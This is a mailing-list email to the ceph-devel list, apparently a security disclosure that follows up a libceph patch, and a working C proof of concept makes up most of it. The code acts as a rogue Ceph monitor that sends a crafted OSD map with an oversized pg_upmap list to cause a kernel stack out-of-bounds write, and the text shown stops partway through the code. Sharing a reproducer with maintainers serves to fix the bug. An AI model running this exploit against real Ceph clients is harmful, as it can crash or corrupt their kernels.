Received: from mail-pg1-f172.google.com (mail-pg1-f172.google.com [209.85.215.172])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CBFE724DD15
	for <ceph-devel@vger.kernel.org>; Sun, 14 Jun 2026 17:47:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.172
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781459231; cv=pass; b=nLU7KX868+GJtNKul44Z749M86pdgGNCndSAWNfTUI/3rpUNFupCHY+o5fUJYNG85ubhZbQ+rshRqOkddByyh8bnjDaTEK+hBLk+cyl0jIF4NF9O/MOE7OnDFckzdWJdWBKl8kqexd+M8hcNjId7pDwbN7Cr4u2G4R6RfxYQur4=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781459231; c=relaxed/simple;
	bh=VhtzwCQNviqLm92KJ/ZhALRP8xlTN8sHGyJjRNhM1lw=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=MN59lgr1QNlx4O1hENGVdWMmZE5wTItRvHLcVw33fSc4pB5FTZrnum7//2Kjt9Y+iKLoLwThzxFw9ZQ2uyvNqhUJE67Bbw+ry4J/b4A3E/soYycXwO9NaDyK4+Qmr0iq7+o8aLOJVeVmagbPmDRMd3rEgox9AaVRQUIELCAYyEU=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=oO1+72+v; arc=pass smtp.client-ip=209.85.215.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="oO1+72+v"
Received: by mail-pg1-f172.google.com with SMTP id 41be03b00d2f7-c85b73ffb52so1077904a12.3
        for <ceph-devel@vger.kernel.org>; Sun, 14 Jun 2026 10:47:07 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1781459227; cv=none;
        d=google.com; s=arc-20240605;
        b=RfLOaM0KiIaA321+uXg/jH/ZB5dg9EBJm58Sn2OGJb8HU3u2awqdqcSaKy3LKaPGwu
         UmYqwqV0CQgCsVx6KtaxBHtXJGOloQMrXGbOaQ0y9UkFVcyzhteZkLobyQvwB0pM59EF
         HynD4CRfCpX/mCaBqET57bsduo5Dj/CIabtgaluRImBxzbGkcTL5Y1fDvhrkrM8Ky7Zb
         NfYW9L8aRxW8nF3tRU3X0tlmsp2fiCiOWzM7PTPUQpVL9pWiX9X0OozY/+JCgQxrlLVC
         ceKJ6FPeX5MOc/sPy+BXsPSFN1gh1S3GocT8n5QLhvYG6RhYWbOXA+aUgBziGWjEXgsa
         4zvQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=7D3GzUKt4RRyTgYnBTjrr6gisNi1ErWVjNhW88v0Sa4=;
        fh=QKpplr34cBQe4f74AWCFuAHHY9p9fDNoFzYZk8kx00s=;
        b=h3RdnIfsiR79f5iSp/voNYj4qDRoJ6evp0f0kOtNpWCVtMD8pct3cM64b9Pdwej6qr
         VhfCc2VVcV5xvb8b+MnTxtXKQyrjH5SxB6mlX5VS3CRPygdGZ3G0DWU0JoCt5IS8PAGN
         xOov02hP92YH+KgDK1xBoRnqkZ4MBUVZBwIR9GGr4YRl7/n6P2k8T9h71BlFUIYSWl9j
         kVgADepDk9wr49uqk68QT/5faY+ARL+5EncSAyWahBEg+UAkcsU3WsaqCcNReqa9CUrz
         ljChlYSI/hHuakgX6/1JYPLkjAP+Za9qdDq8sIwfBQgPXdXwrkT+J3T07a7RdRAnqwiH
         wAeA==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1781459227; x=1782064027; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=7D3GzUKt4RRyTgYnBTjrr6gisNi1ErWVjNhW88v0Sa4=;
        b=oO1+72+vy5NfEdy6qgXqd8VeSaL2StgrSK4GOByBwUxz/G+ffZMCf4E41VFZ0yUUwz
         v2omfzsXWyEO6JA480BtKchvNpT5VHxxXcFNZCBlpeY/fUcbz4vrGVCrrr6yj1Ys/6mU
         kI+daNFJwISS3stJZ6o5COZrJK+XrtQa/mHBDuSm27aUuv3Yus+ga6CN8kZPuTVhO2Ko
         wvTLvI6Pkco9jSHskXDt7kBKB/WBkdsvaWqq+z8aMo9hzo1I+9SdYT8zhCB2a1lNUjUL
         ytytjo6qIFs+0dsjSqFmBcxT2Obdy8A/+0h8PSVSiRlxoZEaGMElCC94983k8NeByCmH
         ox9w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781459227; x=1782064027;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=7D3GzUKt4RRyTgYnBTjrr6gisNi1ErWVjNhW88v0Sa4=;
        b=F7CxJ4qJsPm1SO4ARxjNIy4KL3X3Xdkf/BK85n5CA/of3IwkI5iDAwGIka2uT00zv/
         To/AqzlIBy1Ip/6kgj+INrxzX9jtDcoCUgl1kOZ57IQlxi493Z6LIkWsiItnrnwYgQlC
         0oACcQynkxSA9LqLrLoD59DQ1T94vyGKEJqdCW8ewdJ/2iVQGtVNKp88hg+FYYa1Th5v
         OFdnApMQyFJJ2RtqUIpEDUP4GT8VGNQR6LKKlaIKAHHthjtgUXwAuw8sh1euo1olLLSo
         FYM0iM/9Vqu68VIkcLbHgZHvrvqB1k8cxcfu7jMrR90XfFPX+DtV8ZQmNNvPbBJBXwqv
         Gf0A==
X-Forwarded-Encrypted: i=1; AFNElJ/D107iDKPEBEonpfGsh9nJ+Dkc7B9Yr7dBXvUX8OmpDebUttmrw5NfZBUPuzyKHn0L3dgX39IizUY+@vger.kernel.org
X-Gm-Message-State: AOJu0Yw3pNGMuh+pmldI2D8PZlqd/mugvMFCIIyPtmTr4EV4um/ovGFD
	KHc6y6AjVLj73Z9nlJLnbnxAVHPx1sn+Uq/QGCGsjX/6OcfOBCY2Tqz/jAQ8fVV7C4bRL/aK3uZ
	vqmvMVWA/tZELODGQgJ00dU5E9Ad/dyXNrwyJ36bz0ajg0PYuwotl7n1pozs=
X-Gm-Gg: Acq92OHBb1D4CreXbQOz/RPBd3FJcS+EJhLENSU32pTo6aZk9r5OIW3pLj60fBome+/
	N1a3Sfh6OC8cVe6OdyzVIVniwL9Ig4yOF80Hbuh0XQMh5f/qYSLHNeO+O5yjdgMyGQIhDeGjElo
	/0VMS3t6Sqk1zSqDYf22QtqLH6ozGlek9e2NIWjqKTwZV/W/jgIpgcX6FjFT2XvCM0PivDrCRdD
	/6ZZTIlWSR9jbt2KcSuaL2leDFhgBQud3kZkD0F+K69obeLyFqyJZ2sa91HS2u1oCLG6538vNiF
	azcUjzQ83JqHPci5Zg2Uf49YIbFLl0KkZhE6
X-Received: by 2002:a05:6a20:4325:b0:3b3:1c7b:ff7 with SMTP id
 adf61e73a8af0-3b79644d99bmr8398716637.46.1781459226871; Sun, 14 Jun 2026
 10:47:06 -0700 (PDT)
Precedence: bulk
X-Mailing-List: ceph-devel@vger.kernel.org
List-Id: <ceph-devel.vger.kernel.org>
List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260609044009.2564543-1-xmei5@asu.edu> <CAPpSM+RMkjsg2OXQdumPdxrF01L1wxNLSx=HyVw9BiBdpB_7KQ@mail.gmail.com>
In-Reply-To: <CAPpSM+RMkjsg2OXQdumPdxrF01L1wxNLSx=HyVw9BiBdpB_7KQ@mail.gmail.com>
From: Xiang Mei <xmei5@asu.edu>
Date: Sun, 14 Jun 2026 10:46:55 -0700
X-Gm-Features: AVVi8Ce5awN6abB4A5t0lLalA17byU5nkhAiKmb2vSt3WQwDCIJQz7bj2J2RoTo
Message-ID: <CAPpSM+T1H_Ra_GMh_NuKG-=FP-fmFrt+XhQHJ1ya=N==wvRxjQ@mail.gmail.com>
Subject: Re: [PATCH net] libceph: bound pg_temp/pg_upmap osd list length to CEPH_PG_MAX_SIZE
To: Ilya Dryomov <idryomov@gmail.com>, andriy.shevchenko@linux.intel.com, 
	ceph-devel@vger.kernel.org
Cc: Alex Markuze <amarkuze@redhat.com>, Viacheslav Dubeyko <slava@dubeyko.com>, 
	Weiming Shi <bestswngs@gmail.com>, linux-kernel@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi maintainers,

Here is the artifact that could help you reproduce this stack OOB.

1) Required CONFIG:
```
CONFIG_CEPH_LIB=3Dy
CONFIG_BLK_DEV_RBD=3Dy
CONFIG_CEPH_FS=3Dy
```
2) PoC
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <dirent.h>
#include <pthread.h>

/* ----- ceph constants ----- */
#define CEPH_BANNER "ceph v027"          /* 9 bytes */
#define MON_PORT 6789

#define CEPH_MSGR_TAG_READY 1
#define CEPH_MSGR_TAG_MSG   7
#define CEPH_MSGR_TAG_ACK   8
#define CEPH_MSGR_TAG_KEEPALIVE  9
#define CEPH_MSGR_TAG_KEEPALIVE2 14
#define CEPH_MSGR_TAG_KEEPALIVE2_ACK 15

#define CEPH_MSG_MON_MAP            4
#define CEPH_MSG_MON_SUBSCRIBE      15
#define CEPH_MSG_MON_SUBSCRIBE_ACK  16
#define CEPH_MSG_AUTH               17
#define CEPH_MSG_AUTH_REPLY         18
#define CEPH_MSG_MON_GET_VERSION    19
#define CEPH_MSG_MON_GET_VERSION_REPLY 20
#define CEPH_MSG_OSD_MAP            41

#define CEPH_ENTITY_TYPE_MON 0x01
#define CEPH_ENTITY_TYPE_CLIENT 0x08

#define CEPH_AUTH_NONE 1

#define CEPH_ENTITY_ADDR_TYPE_LEGACY 1

#define CEPH_MSG_FOOTER_COMPLETE 1

/* crush */
#define CRUSH_MAGIC 0x00010000u
#define CRUSH_BUCKET_STRAW2 5
#define CRUSH_RULE_TAKE 1
#define CRUSH_RULE_CHOOSE_FIRSTN 2
#define CRUSH_RULE_EMIT 4
#define CRUSH_ITEM_NONE 0x7fffffff

/* ---- crc32c (Castagnoli) ---- */
static uint32_t crc32c_table[256];
static void crc32c_init(void) {
    for (uint32_t i =3D 0; i < 256; i++) {
        uint32_t c =3D i;
        for (int k =3D 0; k < 8; k++)
            c =3D (c & 1) ? (0x82f63b78u ^ (c >> 1)) : (c >> 1);
        crc32c_table[i] =3D c;
    }
}
/* Linux kernel crc32c(seed, buf, len): reflected CRC-32C with the given se=
ed,
 * NO pre/post inversion. ceph calls crc32c(0, ...). */
static uint32_t crc32c(uint32_t crc, const void *buf, size_t len) {
    const uint8_t *p =3D buf;
    while (len--) crc =3D crc32c_table[(crc ^ *p++) & 0xff] ^ (crc >> 8);
    return crc;
}

/* ---- little buffer builder ---- */
typedef struct { uint8_t *b; size_t len, cap; } buf_t;
static void bufinit(buf_t *x){ x->cap=3D4096; x->len=3D0; x->b=3Dmalloc(x->=
cap); }
static void bufneed(buf_t *x, size_t n){
    if (x->len+n > x->cap){ while(x->len+n>x->cap) x->cap*=3D2;
x->b=3Drealloc(x->b,x->cap);} }
static void p8(buf_t *x,uint8_t v){bufneed(x,1);x->b[x->len++]=3Dv;}
static void p16(buf_t *x,uint16_t
v){bufneed(x,2);memcpy(x->b+x->len,&v,2);x->len+=3D2;}
static void p32(buf_t *x,uint32_t
v){bufneed(x,4);memcpy(x->b+x->len,&v,4);x->len+=3D4;}
static void p64(buf_t *x,uint64_t
v){bufneed(x,8);memcpy(x->b+x->len,&v,8);x->len+=3D8;}
static void praw(buf_t *x,const void*d,size_t
n){bufneed(x,n);memcpy(x->b+x->len,d,n);x->len+=3Dn;}
static void pzero(buf_t *x,size_t
n){bufneed(x,n);memset(x->b+x->len,0,n);x->len+=3Dn;}

/* ---- socket helpers ---- */
static int readn(int fd, void *buf, size_t n){
    uint8_t *p=3Dbuf; size_t got=3D0;
    while (got<n){ ssize_t r=3Dread(fd,p+got,n-got);
        if (r<0){ if(errno=3D=3DEINTR) continue; return -1;}
        if (r=3D=3D0) return 0; got+=3Dr; }
    return 1;
}
static int writen(int fd, const void *buf, size_t n){
    const uint8_t *p=3Dbuf; size_t put=3D0;
    while (put<n){ ssize_t r=3Dwrite(fd,p+put,n-put);
        if (r<0){ if(errno=3D=3DEINTR) continue; return -1;}
        put+=3Dr; }
    return 1;
}

static uint8_t g_fsid[16] =3D {
    0xde,0xad,0xbe,0xef,0x00,0x11,0x22,0x33,
    0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb
};

/* msg header is 53 bytes (packed) */
#pragma pack(push,1)
struct msg_header {
    uint64_t seq;
    uint64_t tid;
    uint16_t type;
    uint16_t priority;
    uint16_t version;
    uint32_t front_len;
    uint32_t middle_len;
    uint32_t data_len;
    uint16_t data_off;
    uint8_t  src_type;
    uint64_t src_num;
    uint16_t compat_version;
    uint16_t reserved;
    uint32_t crc;
};
struct msg_footer { /* MSG_AUTH-featured footer, 21 bytes */
    uint32_t front_crc, middle_crc, data_crc;
    uint64_t sig;
    uint8_t  flags;
};
#pragma pack(pop)

static uint64_t g_out_seq =3D 0;

/* send one MSG (front-only) */
static int send_msg(int fd, uint16_t type, uint16_t version,
                    const void *front, uint32_t front_len) {
    struct msg_header h;
    memset(&h, 0, sizeof(h));
    h.seq =3D ++g_out_seq;
    h.tid =3D 0;
    h.type =3D type;
    h.priority =3D 0;
    h.version =3D version;
    h.front_len =3D front_len;
    h.middle_len =3D 0;
    h.data_len =3D 0;
    h.data_off =3D 0;
    h.src_type =3D CEPH_ENTITY_TYPE_MON;
    h.src_num =3D 0;
    h.compat_version =3D 0;
    h.reserved =3D 0;
    h.crc =3D crc32c(0, &h, offsetof(struct msg_header, crc)); /* 49 */

    struct msg_footer f;
    memset(&f, 0, sizeof(f));
    f.front_crc =3D crc32c(0, front, front_len);
    f.middle_crc =3D 0;
    f.data_crc =3D 0;
    f.sig =3D 0;
    f.flags =3D CEPH_MSG_FOOTER_COMPLETE;

    uint8_t tag =3D CEPH_MSGR_TAG_MSG;
    if (writen(fd, &tag, 1) <=3D 0) return -1;
    if (writen(fd, &h, sizeof(h)) <=3D 0) return -1;
    if (front_len && writen(fd, front, front_len) <=3D 0) return -1;
    if (writen(fd, &f, sizeof(f)) <=3D 0) return -1;
    return 0;
}

/* ---------- build MON_MAP front ---------- */
static void build_monmap(buf_t *out) {
    buf_t blob; bufinit(&blob);
    /* ceph_start_decoding v6 */
    p8(&blob, 6);     /* struct_v */
    p8(&blob, 1);     /* struct_compat */
    size_t slpos =3D blob.len; p32(&blob, 0);   /* struct_len placeholder *=
/
    size_t sstart =3D blob.len;
    praw(&blob, g_fsid, 16);
    p32(&blob, 1);    /* epoch */
    p32(&blob,0); p32(&blob,0);   /* last_changed */
    p32(&blob,0); p32(&blob,0);   /* created */
    /* persistent_features: start_decoding v1 + 0-len */
    p8(&blob,1); p8(&blob,1); p32(&blob,0);
    /* optional_features */
    p8(&blob,1); p8(&blob,1); p32(&blob,0);
    /* num_mon */
    p32(&blob,1);
    /* mon name string "a" */
    p32(&blob,1); p8(&blob,'a');
    /* mon_info_t: start_decoding v1 */
    p8(&blob,1); p8(&blob,1);
    size_t milpos =3D blob.len; p32(&blob,0);
    size_t mistart =3D blob.len;
    /* mi name string "a" */
    p32(&blob,1); p8(&blob,'a');
    /* addrvec: marker 2, count 1 */
    p8(&blob,2);
    p32(&blob,1);
    /* entity_addr: marker 1, start_decoding v1 */
    p8(&blob,1);
    p8(&blob,1); p8(&blob,1);
    size_t ealpos =3D blob.len; p32(&blob,0);
    size_t eastart =3D blob.len;
    p32(&blob, CEPH_ENTITY_ADDR_TYPE_LEGACY); /* type */
    p32(&blob, 0);                            /* nonce */
    size_t addrlenpos =3D blob.len; p32(&blob,0);
    size_t astart =3D blob.len;
    p16(&blob, 2);                  /* sin_family AF_INET (LE) */
    {   uint16_t port =3D htons(MON_PORT); praw(&blob,&port,2); }
    {   uint32_t ip =3D htonl(0x7f000001); praw(&blob,&ip,4); } /* 127.0.0.=
1 */
    pzero(&blob, 8);                /* sin_zero */
    { uint32_t v =3D blob.len - astart; memcpy(blob.b+addrlenpos,&v,4); }
    { uint32_t v =3D blob.len - eastart; memcpy(blob.b+ealpos,&v,4); }
    { uint32_t v =3D blob.len - mistart; memcpy(blob.b+milpos,&v,4); }
    { uint32_t v =3D blob.len - sstart; memcpy(blob.b+slpos,&v,4); }

    p32(out, (uint32_t)blob.len);
    praw(out, blob.b, blob.len);
    free(blob.b);
}

/* ---------- build AUTH_REPLY front (auth=3Dnone) ----------
 * ceph_handle_auth_reply parses:
 *   u32 protocol; s32 result; u64 global_id; u32 payload_len; [payload];
 *   u32 msg_len; [msg]
 */
static void build_auth_reply(buf_t *out) {
    p32(out, CEPH_AUTH_NONE); /* protocol */
    p32(out, 0);              /* result =3D 0 (success) */
    p64(out, 0x1234);         /* global_id (nonzero) */
    p32(out, 0);              /* payload_len =3D 0 */
    p32(out, 0);              /* result_msg_len =3D 0 */
}

/* ---------- build MON_SUBSCRIBE_ACK front ---------- */
static void build_sub_ack(buf_t *out) {
    p32(out, 300);            /* duration */
    praw(out, g_fsid, 16);    /* fsid */
}

/* ---------- build MON_GET_VERSION_REPLY front ----------
 * handle_get_version_reply: u64 handle(tid echo as front? actually:
 *   le64 handle; le64 version; le64 oldest_version (v>=3D2)
 * The msg header tid carries the request tid; front carries handle+version=
.
 */
static void build_get_version_reply(buf_t *out, uint64_t handle,
uint64_t version) {
    p64(out, handle);         /* handle (tid) */
    p64(out, version);        /* version */
    p64(out, 1);              /* oldest_version */
}

/* ---------- build the minimal CRUSH map ---------- */
static void build_crush(buf_t *c) {
    p32(c, CRUSH_MAGIC);
    p32(c, 1);   /* max_buckets */
    p32(c, 1);   /* max_rules */
    p32(c, 4);   /* max_devices */
    /* bucket[0] */
    p32(c, CRUSH_BUCKET_STRAW2); /* alg (outer) */
    p32(c, (uint32_t)-1);        /* id =3D -1 */
    p16(c, 1);                   /* type */
    p8(c, CRUSH_BUCKET_STRAW2);  /* alg (inner, must match) */
    p8(c, 0);                    /* hash */
    p32(c, 0x10000);             /* weight */
    p32(c, 4);                   /* size */
    p32(c, 0); p32(c, 1); p32(c, 2); p32(c, 3); /* items */
    /* straw2: item_weights[size] */
    p32(c, 0x10000); p32(c, 0x10000); p32(c, 0x10000); p32(c, 0x10000);
    /* rule[0] */
    p32(c, 1);   /* present */
    p32(c, 3);   /* len =3D 3 steps */
    /* mask: ruleset=3D0,type=3D1,min_size=3D1,max_size=3D10 */
    p8(c,0); p8(c,1); p8(c,1); p8(c,10);
    /* steps */
    p32(c, CRUSH_RULE_TAKE); p32(c, (uint32_t)-1); p32(c, 0);
    p32(c, CRUSH_RULE_CHOOSE_FIRSTN); p32(c, 0); p32(c, 0);
    p32(c, CRUSH_RULE_EMIT); p32(c, 0); p32(c, 0);
    /* type_names, names, rule_name_map: all empty */
    p32(c, 0);
    p32(c, 0);
    p32(c, 0);
    /* tunables */
    p32(c, 2);  /* choose_local_tries */
    p32(c, 5);  /* choose_local_fallback_tries */
    p32(c, 19); /* choose_total_tries */
    p32(c, 1);  /* chooseleaf_descend_once */
    p8(c, 1);   /* chooseleaf_vary_r */
    p8(c, 0);   /* straw_calc_version */
    p32(c, 0);  /* allowed_bucket_algs */
    p8(c, 1);   /* chooseleaf_stable */
}

/* ---------- build the full osdmap blob with the malicious pg_upmap
---------- */
#define UPMAP_LEN 64           /* > CEPH_PG_MAX_SIZE(32) */
#define MAX_OSD 4

static void build_osdmap_blob(buf_t *m) {
    /* wrapper (get_osdmap_client_data_v): struct_v>=3D7 */
    p8(m, 8);  /* wrapper struct_v */
    p8(m, 7);  /* wrapper struct_compat (<=3D7) */
    p32(m, 0); /* wrapper struct_len (ignored) */
    p8(m, 8);  /* client-data struct_v (=3D=3D struct_v used below) */
    p8(m, 1);  /* client-data struct_compat (<=3D1) */
    p32(m, 0); /* client-data struct_len (ignored) */

    /* fsid, epoch, created, modified */
    praw(m, g_fsid, 16);
    p32(m, 1);                 /* epoch */
    p32(m,0); p32(m,0);        /* created */
    p32(m,0); p32(m,0);        /* modified */

    /* pools: num=3D1 */
    p32(m, 1);
    p64(m, 1);                 /* pool id 1 */
    /* decode_pool: ev=3D5, cv=3D5 */
    p8(m, 5); p8(m, 5);
    size_t plpos =3D m->len; p32(m, 0); /* pool struct_len placeholder */
    size_t pstart =3D m->len;
    p8(m, 1);                  /* type =3D replicated */
    p8(m, 3);                  /* size =3D 3 */
    p8(m, 0);                  /* crush_ruleset =3D 0 */
    p8(m, 2);                  /* object_hash */
    p32(m, 1);                 /* pg_num =3D 1  -> mask 0 -> all seeds map =
to 0 */
    p32(m, 1);                 /* pgp_num =3D 1 */
    pzero(m, 8+4+8+4);         /*
lpg,lpgp,last_change,snap_seq,snap_epoch (24) */
    p32(m, 0);                 /* num_snaps =3D 0 */
    p32(m, 0);                 /* removed_snaps map count =3D 0 */
    p64(m, 0);                 /* auid */
    p64(m, 0);                 /* flags */
    p32(m, 0);                 /* crash_replay_interval */
    /* ev=3D5 -> stop here (min_size computed) */
    { uint32_t v =3D m->len - pstart; memcpy(m->b+plpos,&v,4); }

    /* pool_names: num=3D1 */
    p32(m, 1);
    p64(m, 1);                 /* pool id 1 */
    p32(m, 3); praw(m, "rbd", 3);

    p32(m, 1);                 /* pool_max */
    p32(m, 0);                 /* flags */

    /* max_osd */
    p32(m, MAX_OSD);

    /* osd_state[] (struct_v>=3D5 -> u32) */
    p32(m, MAX_OSD);
    for (int i=3D0;i<MAX_OSD;i++) p32(m, 0x3); /* EXISTS|UP */
    /* osd_weight[] */
    p32(m, MAX_OSD);
    for (int i=3D0;i<MAX_OSD;i++) p32(m, 0x10000); /* IN */
    /* osd_addr[] (struct_v>=3D8 -> addrvec, count 0 each) */
    p32(m, MAX_OSD);
    for (int i=3D0;i<MAX_OSD;i++) { p8(m, 2); p32(m, 0); } /* marker 2, cou=
nt 0 */

    /* pg_temp: num=3D0 */
    p32(m, 0);
    /* primary_temp: num=3D0 */
    p32(m, 0);
    /* primary_affinity: len=3D0 */
    p32(m, 0);

    /* crush */
    buf_t cr; bufinit(&cr); build_crush(&cr);
    p32(m, (uint32_t)cr.len);
    praw(m, cr.b, cr.len);
    free(cr.b);

    /* erasure_code_profiles (struct_v>=3D3): map count 0 */
    p32(m, 0);

    /* pg_upmap (struct_v>=3D4): num=3D1 -- THE BUG */
    p32(m, 1);
    /* ceph_decode_pgid: version<=3D1, pool, seed, preferred */
    p8(m, 1);                  /* pgid version */
    p64(m, 1);                 /* pool =3D 1 (matches our pool) */
    p32(m, 0);                 /* seed =3D 0 (pg_num=3D1 maps every pgid he=
re) */
    p32(m, 0);                 /* preferred (deprecated) */
    /* __decode_pg_upmap -> __decode_pg_temp: len=3D64, NO bound */
    p32(m, UPMAP_LEN);
    for (int i=3D0;i<UPMAP_LEN;i++)
        p32(m, 0x41414141);    /* >=3D max_osd(4): bypasses weight check */

    /* pg_upmap_items: num=3D0 */
    p32(m, 0);
}

/* ---------- build OSD_MAP message front ---------- */
static void build_osdmap_msg(buf_t *out) {
    praw(out, g_fsid, 16);     /* fsid */
    p32(out, 0);               /* nr_inc_maps =3D 0 */
    p32(out, 1);               /* nr_full_maps =3D 1 */
    p32(out, 1);               /* epoch =3D 1 */
    buf_t blob; bufinit(&blob); build_osdmap_blob(&blob);
    p32(out, (uint32_t)blob.len);
    praw(out, blob.b, blob.len);
    free(blob.b);
}

/* read one incoming MSG; return 1 if MSG (sets *type_out,*tid_out), 0
other, -1 closed */
static int recv_one(int fd, uint16_t *type_out, uint64_t *tid_out) {
    uint8_t tag;
    if (readn(fd, &tag, 1) <=3D 0) return -1;
    if (tag =3D=3D CEPH_MSGR_TAG_KEEPALIVE) return 0;
    if (tag =3D=3D CEPH_MSGR_TAG_KEEPALIVE2) {
        /* followed by struct ceph_timespec (2x __le32 =3D 8 bytes) */
        uint8_t ts[8];
        if (readn(fd, ts, 8) <=3D 0) return -1;
        uint8_t ack =3D CEPH_MSGR_TAG_KEEPALIVE2_ACK;
        writen(fd, &ack, 1);
        writen(fd, ts, 8);        /* echo timestamp back */
        return 0;
    }
    if (tag =3D=3D CEPH_MSGR_TAG_KEEPALIVE2_ACK) {
        uint8_t ts[8]; if (readn(fd, ts, 8) <=3D 0) return -1; return 0;
    }
    if (tag =3D=3D CEPH_MSGR_TAG_ACK) {
        uint64_t s; if (readn(fd,&s,8)<=3D0) return -1; return 0;
    }
    if (tag !=3D CEPH_MSGR_TAG_MSG) {
        fprintf(stderr, "[mon] unknown tag %u, closing\n", tag);
        return -1;
    }
    struct msg_header h;
    if (readn(fd, &h, sizeof(h)) <=3D 0) return -1;
    uint32_t fl =3D h.front_len, ml =3D h.middle_len, dl =3D h.data_len;
    static uint8_t fbuf[65536];
    uint32_t tot =3D fl + ml + dl;
    uint32_t got =3D 0;
    while (tot) { uint32_t c =3D tot > sizeof(fbuf)-got ? sizeof(fbuf)-got =
: tot;
        if (c=3D=3D0) c =3D tot > sizeof(fbuf) ? sizeof(fbuf) : tot, got=3D=
0;
        if (readn(fd, fbuf+ (got<sizeof(fbuf)?got:0), c) <=3D 0) return -1;
        got +=3D c; tot -=3D c; if (got>=3Dsizeof(fbuf)) got=3D0; }
    struct msg_footer f;
    if (readn(fd, &f, sizeof(f)) <=3D 0) return -1;
    /* ack this message */
    uint8_t ack =3D CEPH_MSGR_TAG_ACK;
    uint64_t seq =3D h.seq;
    writen(fd, &ack, 1);
    writen(fd, &seq, 8);
    if (type_out) *type_out =3D h.type;
    if (tid_out) *tid_out =3D h.tid;
    return 1;
}

static void serve_client(int fd) {
    int one =3D 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    /* ---- Step 1: read client banner (9) + banner addr (136) ---- */
    uint8_t banner[9];
    if (readn(fd, banner, 9) <=3D 0) { fprintf(stderr,"[mon] no
banner\n"); return; }
    uint8_t caddr[136];
    if (readn(fd, caddr, 136) <=3D 0) { fprintf(stderr,"[mon] no
caddr\n"); return; }
    fprintf(stderr, "[mon] got client banner\n");

    /* ---- Step 2: send banner + actual_peer_addr + peer_addr_for_me ----
     * actual_peer_addr: keep it FULLY BLANK (all-zero in_addr, nonce 0). T=
hen
     *   process_banner takes the ceph_addr_is_blank() && nonce-match path =
and
     *   skips the exact memcmp against the dialed mon addr. Also family=3D=
=3D0 so
     *   ceph_decode_banner_addr's WARN_ON(ss_family=3D=3D512) cannot fire.
     * peer_addr_for_me: client's addr as we see it. Banner form
stores ss_family
     *   in network byte order; the kernel does ntohs(). To yield
family=3D=3DAF_INET(2)
     *   we must store htons(2) =3D=3D bytes {00,02}. */
    if (writen(fd, CEPH_BANNER, 9) <=3D 0) return;
    uint8_t paddr[136];
    memset(paddr, 0, sizeof(paddr));   /* actual_peer_addr: fully blank */
    if (writen(fd, paddr, 136) <=3D 0) return;
    /* peer_addr_for_me */
    memset(paddr, 0, sizeof(paddr));
    {
        uint16_t fam_be =3D htons(2);    /* AF_INET in network order */
        memcpy(paddr + 8, &fam_be, 2);
        uint16_t port =3D htons(0);
        memcpy(paddr + 8 + 2, &port, 2);
        uint32_t ip =3D htonl(0x7f000001);
        memcpy(paddr + 8 + 4, &ip, 4);
    }
    if (writen(fd, paddr, 136) <=3D 0) return;
    fprintf(stderr, "[mon] sent banner+addrs\n");

    /* ---- Step 3: read ceph_msg_connect (33 bytes) ---- */
    uint8_t conn[33];
    if (readn(fd, conn, 33) <=3D 0) { fprintf(stderr,"[mon] no
connect\n"); return; }
    uint32_t auth_len; memcpy(&auth_len, conn+28, 4);
    if (auth_len) { uint8_t *a=3Dmalloc(auth_len); readn(fd,a,auth_len);
free(a); }
    fprintf(stderr, "[mon] got connect (auth_len=3D%u)\n", auth_len);

    /* ---- Step 4: send ceph_msg_connect_reply (26 bytes), TAG_READY ---- =
*/
    #pragma pack(push,1)
    struct conn_reply {
        uint8_t tag; uint64_t features; uint32_t global_seq;
        uint32_t connect_seq; uint32_t protocol_version;
        uint32_t authorizer_len; uint8_t flags;
    } cr;
    #pragma pack(pop)
    memset(&cr, 0, sizeof(cr));
    cr.tag =3D CEPH_MSGR_TAG_READY;
    cr.features =3D 0xffffffffffffffffULL;
    cr.global_seq =3D 1;
    cr.connect_seq =3D 1;
    cr.protocol_version =3D 15;            /* MONC */
    cr.authorizer_len =3D 0;
